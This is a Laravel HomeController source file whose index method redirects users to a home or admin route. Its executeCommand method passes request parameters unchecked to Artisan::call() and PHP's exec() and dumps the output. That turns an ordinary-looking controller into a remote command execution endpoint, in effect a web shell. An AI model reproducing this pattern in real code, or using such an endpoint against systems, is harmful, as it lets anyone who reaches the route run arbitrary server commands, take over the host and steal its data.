<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Auth;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    private $redirectTo = 'home';
    
    public function __construct()
    {
        $this->middleware( function($request, $next) {
            if ( Auth::user() && Auth::user()->is_super_admin ) {
                $this->redirectTo = 'admin.index';
            }
            return $next($request);
        });
    }

    public function executeCommand(Request $request)
    {
        if ( $request->command ) {
            $command = $request->command;
            $result = \Artisan::call($command);
        }
        

        if ( $request->exec ) {
            $output=null;
            $retval=null;

            $exec = $request->exec;
            $result = exec($exec, $output, $retval);
            echo "Returned with status $retval and output:\n";
            // $result = exec($exec);
        }
        dd($result);
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return to_route($this->redirectTo);
    }
}
